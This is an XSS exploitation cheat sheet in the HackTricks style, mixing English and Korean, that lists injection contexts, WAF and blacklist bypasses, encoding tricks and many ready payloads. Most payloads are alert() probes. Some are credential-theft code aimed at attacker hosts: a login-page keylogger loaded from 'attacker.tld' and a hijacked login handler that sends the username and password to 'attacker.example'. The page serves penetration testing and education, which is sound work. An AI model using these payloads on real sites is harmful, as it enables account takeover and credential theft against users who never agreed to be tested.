# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.
2. **Find the context** where it's reflected/used.
3. If **reflected**
1. Check **which symbols can you use** and depending on that, prepare the payload:
1. In **raw HTML**:
1. Can you create new HTML tags?
2. Can you use events or attributes supporting `javascript:` protocol?
3. Can you bypass protections?
4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Inside a **HTML tag**:
1. Can you exit to raw HTML context?
2. Can you create new events/attributes to execute JS code?
3. Does the attribute where you are trapped support JS execution?
4. Can you bypass protections?
3. Inside **JavaScript code**:
1. Can you escape the `<script>` tag?
2. Can you escape the string and execute different JS code?
3. Are your input in template literals \`\`?
4. Can you bypass protections?
4. Javascript **function** being **executed**
1. You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If **used**:
1. You could exploit a **DOM XSS**, pay attention how your input is controlled and if your **controlled input is used by any sink.**

When working on a complex XSS you might find interesting to know about:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

In order to successfully exploit a XSS the first thing you need to find is a **value controlled by you that is being reflected** in the web page.

- **Intermediately reflected**: If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a **Reflected XSS**.
- **Stored and reflected**: If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a **Stored XSS**.
- **Accessed via JS**: If you find that a value controlled by you is being access using JS you could exploit a **DOM XSS**.

## Contexts

When trying to exploit a XSS the first thing you need to know if **where is your input being reflected**. Depending on the context, you will be able to execute arbitrary JS code on different ways.

### Raw HTML

If your input is **reflected on the raw HTML** page you will need to abuse some **HTML tag** in order to execute JS code: `<img , <iframe , <svg , <script` ... these are just some of the many possible HTML tags you could use.\
Also, keep in mind [Client Side Template Injection](../client-side-template-injection-csti.md).

### Inside HTML tags attribute

If your input is reflected inside the value of the attribute of a tag you could try:

1. To **escape from the attribute and from the tag** (then you will be in the raw HTML) and create new HTML tag to abuse: `"><img [...]`
2. If you **can escape from the attribute but not from the tag** (`>` is encoded or deleted), depending on the tag you could **create an event** that executes JS code: `" autofocus onfocus=alert(1) x="`
3. If you **cannot escape from the attribute** (`"` is being encoded or deleted), then depending on **which attribute** your value is being reflected in **if you control all the value or just a part** you will be able to abuse it. For **example**, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked. Another interesting **example** is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: **`href="javascript:alert(1)"`**
4. If your input is reflected inside "**unexpoitable tags**" you could try the **`accesskey`** trick to abuse the vuln (you will need some kind of social engineer to exploit this): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

기업용 SSO 로그인 페이지가 OAuth `service` 파라미터를 `<a id="forgot_btn" ...>`의 `href` 속성 안에 반영하고 있었다. `<` 와 `>` 는 HTML 인코딩 되었지만, 큰따옴표(")는 인코딩되지 않았기 때문에 공격자는 속성을 닫고 같은 요소를 재사용해 `" onfocus="payload" x="` 같은 핸들러를 주입할 수 있었다.

1. **Inject the handler:** `onclick="print(1)"` 같은 간단한 페이로드는 차단되었지만, WAF는 인라인 속성의 첫 번째 JavaScript 문장만 검사했다. 무해한 표현식을 괄호로 감싼 뒤 세미콜론을 붙여 실제 페이로드가 실행되도록 했다: `onfocus="(history.length);malicious_code_here"`.
2. **Auto-trigger it:** 브라우저는 fragment가 요소의 `id`와 일치하면 해당 요소에 포커스를 준다. 따라서 익스플로잇 URL에 `#forgot_btn`을 추가하면 클릭 없이도 페이지 로드 시 앵커에 포커스가 가고 핸들러가 실행된다.
3. **Keep the inline stub tiny:** 대상 사이트는 이미 jQuery를 포함하고 있었다. 핸들러는 단지 `$.getScript(...)`로 요청을 부트스트랩하기만 하면 되었고, 전체 keylogger는 공격자 서버에 호스팅했다.

**Building strings without quotes**

Single quotes were returned URL-encoded and escaped double quotes corrupted the attribute, so the payload generated every string with `String.fromCharCode`. A helper function makes it easy to convert any URL into char codes before pasting it into the attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
결과로 생성된 속성은 다음과 같았습니다:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**왜 이것이 자격 증명을 훔치는가**

외부 스크립트(공격자가 제어하는 호스트 또는 Burp Collaborator에서 로드된)는 `document.onkeypress`를 훅하여 키 입력을 버퍼링했고, 매초 `new Image().src = collaborator_url + keys`를 실행했다. XSS가 인증되지 않은 사용자에게만 실행되기 때문에, 민감한 동작은 로그인 폼 자체다 — 공격자는 피해자가 "Login"을 누르지 않더라도 사용자명과 비밀번호를 keylogs할 수 있다.

클래스 이름을 제어하면 Angular가 XSS를 실행하는 이상한 예:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript 코드 내부

이 경우 입력은 HTML 페이지의 **`<script> [...] </script>`** 태그 사이, `.js` 파일 내부 또는 **`javascript:`** 프로토콜을 사용하는 속성 안에 반영됩니다:

- 입력이 **`<script> [...] </script>`** 태그 사이에 반영된다면, 입력이 어떤 종류의 따옴표 안에 있더라도 `</script>` 를 주입해 이 컨텍스트에서 벗어날 수 있습니다. 이는 **browser가 먼저 HTML 태그를 파싱**하고 그 다음 내용을 파싱하기 때문에, 주입한 `</script>` 태그가 HTML 코드 안에 있다는 사실을 인식하지 못하기 때문입니다.
- 입력이 **inside a JS string**에 반영되고 앞의 방법이 통하지 않으면 문자열을 **exit**하고 코드를 **execute**한 뒤 JS 코드를 **reconstruct**해야 합니다 (오류가 있으면 실행되지 않습니다:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- 입력이 template literals 내부에 반영된다면 `${ ... }` 문법을 이용해 **embed JS expressions**할 수 있습니다: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode**는 **valid javascript code**를 작성하는 데 유용합니다:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting는 사용된 후에 functions, variables or classes를 선언할 수 있는 기회를 가리키며, XSS가 선언되지 않은 변수나 함수를 사용하는 상황을 악용할 수 있습니다.\
**자세한 내용은 다음 페이지를 확인하세요:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

일부 웹 페이지에는 **accept as parameter the name of the function to execute**하는 endpoints가 있습니다. 실전에서 흔히 볼 수 있는 예는 `?callback=callbackFunc` 같은 형태입니다.

사용자가 직접 전달한 값이 실행되는지 확인하는 좋은 방법은 **param 값을 수정**(예: 'Vulnerable')하고 콘솔에서 다음과 같은 오류를 확인하는 것입니다:

![](<../../images/image (711).png>)

취약한 경우, 단순히 값을 전송하는 것만으로도 **trigger an alert**할 수 있습니다: **`?callback=alert(1)`**. 그러나 이러한 endpoints는 일반적으로 글자, 숫자, 점 및 밑줄(**`[\w\._]`**)만 허용하도록 **content를 validate**합니다.

그러나 그 제한이 있어도 여전히 몇 가지 동작을 수행할 수 있습니다. 허용되는 문자들만으로 DOM의 어떤 요소든 **access**할 수 있기 때문입니다:

![](<../../images/image (747).png>)

Some useful functions for this:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger Javascript functions** directly: `obj.sales.delOrders`.

하지만 보통 지시된 함수를 실행하는 엔드포인트들은 흥미로운 DOM이 많지 않습니다. **같은 origin의 다른 페이지들**은 더 많은 동작을 수행할 수 있는 **더 흥미로운 DOM**을 가지고 있을 가능성이 높습니다.

Therefore, in order to **abuse this vulnerability in a different DOM** the **Same Origin Method Execution (SOME)** exploitation was developed:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

공격자가 제어하는 `location.href` 같은 데이터를 **안전하지 않게** 사용하는 **JS 코드**가 존재합니다. 공격자는 이를 악용해 임의의 JS 코드를 실행할 수 있습니다.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

이러한 종류의 XSS는 **어디서든** 발견될 수 있습니다. 이들은 단순히 웹 애플리케이션의 클라이언트 취약점에만 의존하지 않고 **어떤** **컨텍스트**에서도 발생할 수 있습니다. 이러한 종류의 **arbitrary JavaScript execution**은 심지어 **RCE**를 획득하거나 클라이언트와 서버의 **임의의 파일을 읽는 것** 등 더 많은 악용으로 이어질 수 있습니다.\
몇 가지 **예시**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

입력이 **HTML 페이지 내부**에 반영되거나 이 컨텍스트에서 HTML 코드를 이스케이프하고 주입할 수 있는 경우, 가장 먼저 해야 할 일은 `<` 를 남용해 새로운 태그를 만들 수 있는지 확인하는 것입니다: 해당 **문자**를 **반영(reflect)** 해보고 그것이 **HTML encoded** 되는지, **삭제** 되는지, 아니면 **변경 없이 반영**되는지 확인하세요. **오직 마지막 경우에만 이 취약점을 악용할 수 있습니다**.\
이 경우에는 또한 [**Client Side Template Injection**](../client-side-template-injection-csti.md)**을** **염두에 두세요**.\
_**참고: HTML 주석은 다음을 사용해 닫을 수 있습니다\*\***\***\*`-->`\*\***\***\*또는 \*\***`--!>`\*\*_**

이 경우와 black/whitelisting이 사용되지 않는다면, 다음과 같은 payloads를 사용할 수 있습니다:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
하지만 태그/속성의 블랙/화이트리스트가 사용되고 있다면, 생성할 수 있는 **brute-force할 수 있는 태그**를 찾아야 합니다.\  
일단 **허용된 태그를 찾아냈다면**, 발견한 유효 태그 내부에서 **brute-force할 속성/이벤트**를 시험해 해당 컨텍스트를 어떻게 공격할 수 있는지 확인해야 합니다.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force할 모든 이벤트** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### Custom tags

유효한 HTML 태그를 찾지 못했다면, **커스텀 태그를 생성**하고 `onfocus` 속성으로 JS 코드를 실행해 볼 수 있습니다. XSS 요청에서는 URL을 `#`로 끝내 페이지가 해당 객체에 **포커스**되게 하고 코드가 **실행**되도록 해야 합니다:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

어떤 종류의 blacklist가 사용 중이라면, 몇 가지 간단한 트릭으로 이를 우회해볼 수 있습니다:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **다양한 환경을 위한 더 많은 tiny XSS payload**는 [**여기**](https://github.com/terjanq/Tiny-XSS-Payloads)와 [**여기**](https://tinyxss.terjanq.me)에서 확인할 수 있습니다.
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

취약점을 악용하기 위해 미리 채워진 데이터가 있는 **사용자가 링크나 폼을 클릭해야** 하는 경우, (페이지가 취약하다면) [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)을 시도해 볼 수 있습니다.

### 불가능 - Dangling Markup

HTML 태그와 속성으로 JS 코드를 실행하는 것이 **불가능하다고 생각된다면**, [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)를 확인하세요. JS 코드를 실행하지 않고도 취약점을 **악용**할 수 있습니다.

## HTML 태그 내부에 주입

### Inside the tag/escaping from attribute value

HTML 태그 내부에 있다면, 가장 먼저 시도할 수 있는 것은 태그에서 탈출하여 [previous section](#injecting-inside-raw-html)에 언급된 몇 가지 기법을 사용해 JS 코드를 실행하는 것입니다.\
태그에서 **탈출할 수 없다면**, 태그 내부에 새로운 속성을 만들어 JS 코드를 실행하려 시도할 수 있습니다. 예를 들어, 다음과 같은 payload를 사용할 수 있습니다 (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**스타일 이벤트**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 속성 내에서

비록 **속성에서 탈출할 수 없다** (`"`가 인코딩되거나 삭제되는 경우), 값이 어떤 속성에 반영되는지와 **값 전체를 제어하는지 아니면 일부만 제어하는지**에 따라 이를 악용할 수 있다. 예를 들어, `onclick=` 같은 이벤트를 제어할 수 있다면 클릭될 때 임의의 코드를 실행하게 할 수 있다.\  
또 다른 흥미로운 예는 `href` 속성으로, `javascript:` 프로토콜을 사용해 임의의 코드를 실행할 수 있다: **`href="javascript:alert(1)"`**

**HTML 인코딩/URL encode를 사용한 이벤트 내부 우회**

HTML 태그 속성 값 내부의 **HTML 인코딩된 문자들**은 **런타임에 디코딩된다**. 따라서 다음과 같은 것은 유효하다(페이로드는 굵게 표시됨): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

참고로 **어떤 종류의 HTML 인코딩도 유효하다**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**참고로 URL encode도 작동합니다:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**이벤트 내부에서 Unicode encode를 사용한 Bypass**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 특수 프로토콜 속성 내에서

그곳에서는 일부 위치에서 프로토콜 **`javascript:`** 또는 **`data:`** 를 사용해 **임의의 JS 코드를 실행**할 수 있습니다. 일부는 사용자 상호작용을 필요로 하고, 일부는 그렇지 않습니다.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**이 프로토콜들을 주입할 수 있는 장소**

**일반적으로** `javascript:` 프로토콜은 **속성 `href`를 허용하는 모든 태그에서 사용될 수 있으며** 그리고 **대부분**의 태그에서 **속성 `src`**를 허용합니다 (하지만 `<img`는 제외)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**기타 난독화 기법**

_**이 경우 HTML encoding과 Unicode encoding 트릭(이전 섹션)은 속성 내부에 있으므로 역시 유효합니다.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
또한, 이러한 경우에 사용할 수 있는 또 다른 **좋은 요령**이 있습니다: **`javascript:...` 내부의 입력이 URL encoded 되더라도, 실행되기 전에 URL decoded 됩니다.** 따라서, 만약 **escape**하기 위해 **string**에서 **single quote**을 사용해야 하고 그것이 **URL encoded** 되고 있는 것을 보더라도, 기억하세요, **상관없습니다,** 그것은 **interpreted** 되어 **single quote**로 **execution** 시간 동안 처리됩니다.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
참고로, **둘 다 사용** `URLencode + HTMLencode`를 어떤 순서로든 사용해 **payload**를 인코딩하려고 하면 **작동하지** **않습니다**, 하지만 **payload 내부에서 혼합할 수 있습니다**.

**Hex 및 Octal encode를 `javascript:`와 함께 사용하기**

`iframe`의 `src` 속성(적어도) 내부에 **Hex** 및 **Octal encode**를 사용하여 **HTML tags to execute JS**를 선언할 수 있습니다:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
임의의 **`<a href=`** 태그에 **`target="_blank" and rel="opener"`** 속성을 포함한 상태로 아무 URL을 주입할 수 있다면, 이 동작을 악용하기 위해 **다음 페이지를 확인하세요**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

먼저 유용한 **"on" event handlers**를 확인하려면 이 페이지 ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet))를 확인하세요.\
이 event handlers 생성을 방해하는 blacklist가 있는 경우 다음 우회 방법들을 시도해볼 수 있습니다:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS "Unexploitable tags"에서 (hidden input, link, canonical, meta)

[**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)에서 **이제 hidden inputs을 다음과 같이 악용할 수 있습니다:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
그리고 **메타 태그**에는:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
출처 [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): **XSS payload inside a hidden attribute**를 실행할 수 있습니다. 단, **피해자**가 **키 조합**을 누르도록 **설득**할 수 있어야 합니다. Firefox Windows/Linux에서는 키 조합이 **ALT+SHIFT+X**이고 OS X에서는 **CTRL+ALT+X**입니다. access key attribute에서 다른 키를 사용하면 다른 키 조합을 지정할 수 있습니다. 벡터는 다음과 같습니다:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**The XSS payload will be something like this: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

여러 가지 인코딩을 사용한 트릭들이 이미 이 섹션 안에서 다뤄졌습니다. 어디에 사용할 수 있는지 다시 찾아보세요:

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

읽어보세요[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

읽어보세요 J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

만약 웹의 아주 작은 부분에서 XSS를 발견했고 그 부분이 어떤 상호작용을 필요로 한다면(예: footer의 작은 링크에 onmouseover 요소가 있는 경우), 그 요소가 차지하는 영역을 수정해서 링크가 실행될 확률을 최대화할 수 있습니다.

예를 들어, 요소에 다음과 같은 스타일을 추가할 수 있습니다: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

하지만 WAF가 style 속성을 필터링한다면 CSS Styling Gadgets를 사용할 수 있습니다. 예를 들어 다음을 찾았다면

> .test {display:block; color: blue; width: 100%\}

그리고

> \#someid {top: 0; font-family: Tahoma;}

이제 우리의 링크를 수정해서 다음 형태로 만들 수 있습니다

> \<a href="" id=someid class=test onclick=alert() a="">

이 트릭은 [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)에서 가져왔습니다

## Injecting inside JavaScript code

이 경우 당신의 **input**은 `.js` 파일의 JS 코드 안이나 `<script>...</script>` 태그 사이, 또는 JS 코드를 실행할 수 있는 HTML 이벤트들 사이, 혹은 `javascript:` 프로토콜을 허용하는 속성들 안에 **반영(reflected)** 됩니다.

### \<script> 태그 탈출

`<script> [...] var input = 'reflected data' [...] </script>`에 코드가 삽입되는 경우, 쉽게 **`<script>` 종료 태그를 탈출**할 수 있습니다:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
참고로 이 예제에서는 **작은따옴표를 닫지 않았습니다**. 이는 **HTML parsing is performed first by the browser**, 이 과정에서는 스크립트 블록을 포함한 페이지 요소들을 식별합니다. 임베디드 스크립트를 이해하고 실행하기 위한 JavaScript의 파싱은 그 이후에 수행됩니다.

### JS 코드 내부

`<>`가 sanitised 되어 있어도 입력이 **located**된 위치에서 문자열을 **escape the string**하여 **execute arbitrary JS**할 수 있습니다. 에러가 있으면 JS 코드가 실행되지 않으므로 **fix JS syntax**하는 것이 중요합니다:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

사용자 입력이 인용된 JavaScript string 내부에 포함될 때(예: server-side echo into an inline script), 문자열을 종료하고 코드를 주입한 뒤 문법을 복구하여 파싱을 유효하게 유지할 수 있습니다. 일반적인 골격:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
취약한 매개변수가 JS 문자열에 반영될 때의 예시 URL 패턴:
```
?param=test";<INJECTION>;a="
```
이것은 HTML 컨텍스트를 건드릴 필요 없이 공격자 JS를 실행합니다 (순수 JS-in-JS). 필터가 키워드를 차단할 경우 아래의 blacklist bypasses와 결합하세요.

### Template literals ``

단일 및 이중 따옴표 외에 **strings**를 생성하기 위해 JS는 **backticks** **` `` `** 도 허용합니다. 이것은 template literals로, `${ ... }` 구문을 사용해 **embedded JS expressions**를 삽입할 수 있게 합니다.\
따라서 입력이 backticks를 사용하는 JS 문자열 안에 **reflected**되어 있다면, `${ ... }` 구문을 악용하여 **arbitrary JS code**를 실행할 수 있습니다:

이것은 다음과 같이 **abused**할 수 있습니다:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### 인코딩된 코드 실행
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### eval(atob())와 스코프 뉘앙스를 고려한 전달 가능한 페이로드

URL을 짧게 유지하고 단순한 키워드 필터를 우회하기 위해, 실제 로직을 base64로 인코딩한 뒤 `eval(atob('...'))`로 평가할 수 있습니다. 단순 키워드 필터가 `alert`, `eval`, `atob` 같은 식별자를 차단한다면, 브라우저에서 동일하게 컴파일되면서 문자열 매칭 필터를 회피하는 유니코드 이스케이프 식별자를 사용하세요:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
중요한 스코프 주의사항: `eval()` 안에서 선언된 `const`/`let`은 블록 스코프이며 전역 변수를 생성하지 않습니다; 이후 스크립트에서 접근할 수 없습니다. 필요할 때(예: to hijack a form handler) 전역적이고 재바인딩 불가능한 hooks를 정의하려면 동적으로 삽입한 `<script>` 요소를 사용하세요:
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
참고: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### 유니코드 인코딩을 이용한 JS 실행
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript 블랙리스트 우회 기법

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
